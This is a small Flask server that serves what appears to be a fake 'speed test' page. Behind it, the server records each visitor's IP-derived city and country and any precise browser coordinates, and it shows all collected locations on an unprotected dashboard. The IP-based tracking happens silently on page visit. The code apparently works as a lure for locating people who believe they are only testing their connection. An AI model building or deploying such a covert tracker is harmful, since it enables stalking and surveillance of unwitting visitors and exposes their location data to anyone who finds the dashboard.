from flask import Flask, request, jsonify, send_from_directory
import os
import requests

app = Flask(__name__, static_folder='.')

locations = []

def get_location_from_ip(ip):
    try:
        if ip in ['127.0.0.1', '::1'] or ip.startswith(('192.168.', '10.', '172.')):
            ip = '8.8.8.8'
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
        data = response.json()
        return {
            "lat": data.get("latitude", 35.6892),
            "lng": data.get("longitude", 51.3890),
            "city": data.get("city", "ناشناخته"),
            "country": data.get("country_name", "ناشناخته")
        }
    except:
        return {"lat": 35.6892, "lng": 51.3890, "city": "تهران", "country": "ایران"}

@app.route('/track-ip')
def track_by_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    loc = get_location_from_ip(ip)
    locations.append({
        "lat": loc["lat"],
        "lng": loc["lng"],
        "info": f"{loc['city']}, {loc['country']} (از طریق IP)"
    })
    return jsonify({"status": "ok"})

@app.route('/track-precise', methods=['POST'])
def track_precise():
    data = request.json
    locations.append({
        "lat": data["lat"],
        "lng": data["lng"],
        "info": "مکان دقیق (با اجازه کاربر)"
    })
    return jsonify({"status": "ok"})

@app.route('/data')
def get_data():
    return jsonify(locations)

@app.route('/dashboard')
def dashboard():
    return send_from_directory('.', 'dashboard.html')

@app.route('/')
def speed_test():
    return send_from_directory('.', 'speedtest.html')
